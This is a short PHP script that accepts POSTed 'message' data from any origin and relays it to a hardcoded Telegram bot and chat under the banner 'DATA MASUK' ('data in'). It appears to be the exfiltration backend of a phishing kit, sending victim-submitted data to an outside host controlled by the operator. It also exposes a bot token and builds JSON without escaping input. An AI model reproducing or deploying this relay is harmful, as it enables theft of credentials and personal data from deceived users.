<?php
header('Access-Control-Allow-Origin: *');
$token = "7996026063:AAFbtWnSOyBVhQE3xHLl83HBbrwoD-dobk8";
$chatID = "5332766928";

$content = $_POST['message'];

$newContent = "⚔⚔⚔ DATA MASUK ⚔⚔⚔\n";
$newContent .= $content;
$newContent .= "\n⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"".$newContent."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
